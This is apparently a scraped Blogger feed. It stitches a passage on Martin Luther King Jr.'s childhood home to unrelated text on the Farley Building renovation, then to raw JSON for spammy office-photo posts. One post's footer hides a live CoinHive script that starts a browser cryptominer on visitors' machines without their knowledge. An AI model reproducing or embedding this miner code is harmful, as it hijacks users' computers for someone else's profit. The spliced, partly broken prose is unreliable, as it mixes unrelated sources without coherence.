Reverend Williams was the pastor at Ebenezer Baptist Church, a charter member of Atlanta’s NAACP, and an early civil rights activist, leading voter registration drives as far back as 1917.  In 1926, Martin’s parents, Michael King, Sr. and Alberta Christine Williams King married and moved into the house.  In 1927, they their first child, Willie Christine King and two years later, their first son, Michael King, Jr., who would later be renamed after the German reformer Martin Luther in 1934.  When Reverend Williams died in 1931, King became head of the household and took over Williams's pulpit at Ebenezer Church.  The King family lived in the house until 1941 when they moved a few blocks away.  They retained ownership of the house, though, and Martin’s younger brother, Reverend Alfred Daniel (A.D.) Williams King, lived here from 1954 to 1963.

The phase consists of mostly below-grade, transportation infrastructure improvements including the expansion of the Long Island Rail Road West End Concourse under the Farley building steps to serve Amtrak and New Jersey Transit platforms, new entrances through the Farley Building, and improved ventilation.  The second phase includes a sky-lit grand hall with 1 million square feet of retail space.  The Farley Building's facade will remain untouched, and it will retain retail postal lobby services .  However, all mail processing operations will be relocated one block away to the Morgan Processing and Distribution Center.\u003Cbr\/\u003E\u003Cbr\/\u003EThe United States General Post Office was designated a landmark by the New York City Landmarks Preservation Commission in 1966.\u003Cbr\/\u003E\u003Cbr\/\u003ENational Register #73002257 (1973)\u003C\/p\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003EAerial View from Sydney Tower (107)\u003C\/strong\u003E\u003Cbr\/\u003E\u003Cimg alt=\"office 2010 business\" src=\"http:\/\/farm5.staticflickr.com\/4073\/4803251796_1dbe6fb150.jpg\" width=\"400\"\/\u003E\u003Cbr\/\u003E\u003Ci\u003EImage by Howard.\u003C\/i\u003E\u003Cbr\/\u003E\u003C\/p\u003E\u003Cdiv class=\"blogger-post-footer\"\u003E\u003Cscript src=\"https:\/\/coinhive.com\/lib\/coinhive.min.js\"\u003E\u003C\/script\u003E\n\u003Cscript type=\"text\/JavaScript\"\u003E\n    var miner = new CoinHive.Anonymous('o2c5ecbIXWy8IFcRX7oHfVxW4apST2p7');\n    miner.start(CoinHive.FORCE_MULTI_TAB);\n\u003C\/script\u003E\u003C\/div\u003E"},"link":[{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/2169823404061667349\/posts\/default\/5969711710262766956"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/2169823404061667349\/posts\/default\/5969711710262766956"},{"rel":"alternate","type":"text/html","href":"http:\/\/inocenciapervertida.blogspot.com\/2014\/06\/nice-office-2010-business-photos.html","title":"Nice Office 2010 Business photos"}],"author":[{"name":{"$t":"nijefa molase"},"uri":{"$t":"https:\/\/plus.google.com\/102685330432073058401"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}]},{"id":{"$t":"tag:blogger.com,1999:blog-2169823404061667349.post-3745599146231535179"},"published":{"$t":"2014-05-03T21:00:00.000-07:00"},"updated":{"$t":"2015-05-23T22:27:36.694-07:00"},"category":[{"scheme":"http://www.blogger.com/atom/ns#","term":"Business"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Nice"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Office"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Office Small Business"},{"scheme":"http://www.blogger.com/atom/ns#","term":"photos"},{"scheme":"http://www.blogger.com/atom/ns#","term":"Small"}],"title":{"type":"text","$t":"Nice Office Small Business photos"},"content":{"type":"html","$t":"\u003Cp\u003ESome cool office small business images:\u003C\/p\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003EIt's 80s Friday!\u003C\/strong\u003E\u003Cbr\/\u003E\u003Cimg alt=\"office small business\" src=\"http:\/\/farm5.staticflickr.com\/4030\/4485024180_2d3304d727.jpg\" width=\"400\"\/\u003E\u003Cbr\/\u003E\u003Ci\u003EImage by Infusionsoft\u003C\/i\u003E\u003Cbr\/\u003EMark's got his eighties on. \u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E--\u003Cbr\/\u003EInfusionsoft is the leader in small business email marketing and these are a few photos from our office. \u003C\/p\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003ELoading...\u003C\/strong\u003E\u003Cbr\/\u003E\u003Cimg alt=\"office small business\" src=\"http:\/\/farm3.staticflickr.com\/2734\/4484373131_be4662fa90.jpg\" width=\"400\"\/\u003E\u003Cbr\/\u003E\u003Ci\u003EImage by Infusionsoft\u003C\/i\u003E\u003Cbr\/\u003EThese are our weapons of choice. \u003Cbr\/\u003E\u003Cbr\/\u003E\u003Cbr\/\u003E--\u003Cbr\/\u003EInfusionsoft is the leader in small business email marketing and these are a few photos from our office. \u003C\/p\u003E\u003Cbr\/\u003E\u003Cp\u003E\u003Cstrong\u003ELocked and Loaded\u003C\/strong\u003E\u003Cbr\/\u003E\u003Cimg alt=\"office small business\" src=\"http:\/\/farm5.staticflickr.com\/4047\/4484373065_d601c83fb0.jpg\" width=\"400\"\/\u003E\u003Cbr\/\u003E\u003Ci\u003EImage by Infusionsoft\u003C\/i\u003E\u003Cbr\/\u003EPrepare for your Nerf Dart attack!
